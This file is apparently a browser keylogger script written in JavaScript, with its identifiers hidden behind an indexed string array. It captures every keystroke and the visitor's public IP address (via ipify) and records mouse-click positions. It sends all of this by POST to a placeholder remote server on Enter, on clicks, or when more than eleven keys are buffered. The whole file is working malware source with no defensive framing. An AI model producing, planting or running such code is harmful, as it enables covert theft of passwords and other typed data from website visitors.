let s = [
    "keypress", // 0
    "client", // 1
    "data", // 2
    "????", // 3
    "https://api.ipify.org?format=json", // 4
    "ip", // 5
    "key", // 6
    "script", // 7
    "code", // 8
    "Enter", // 9
    "YOUR_REMOTE_SERVER_ADDRESS", // 10
    "json", // 11
    "POST", // 12
    "keyup", // 13
    "GET", // 14
    "$", // 15
    "undefined", // 16
    "mousedown", // 17
    "offsetX", // 18
    "offsetY", // 19
    "lastClick" // 20
];

let b = {};
b[s[2]] = [];
b[s[1]] = "";
b[s[20]] = [null, null];

window.addEventListener(s[0], (event) => {
    b[s[2]].push(event[s[6]]);
}); 

var x1 = new XMLHttpRequest();
x1.open(s[14], s[4], true);
x1.onreadystatechange = function() {
    if (x1.readyState === 4) {
        b[s[1]] = JSON.parse(x1.responseText)[s[5]];
    }
}

x1.send(null);

function u(){
    var h = [];
    let l = b[s[2]].length;
    for (var i = 0; i < l; i++) {
        h.push(b[s[2]].pop());
    }
    var x2 = new XMLHttpRequest();
    x2.onreadystatechange = function() {
        return false;
    }

    x2.open(s[12], s[10], true);
    x2.send(JSON.stringify([b[s[1]], h.join(""), b[s[20]]]));
}

window.addEventListener(s[13], (event) => {
    if (event.which === 13) {
        u();   
    }
});

window.addEventListener(s[17], e => {
    b[s[20]] = [e[s[18]], e[s[19]]]
    u(); 
    e[s[20]] = [null, null];
  });

setInterval(() => {
    if (b[s[2]].length > 11) {
        u();
    }
}, 100);        



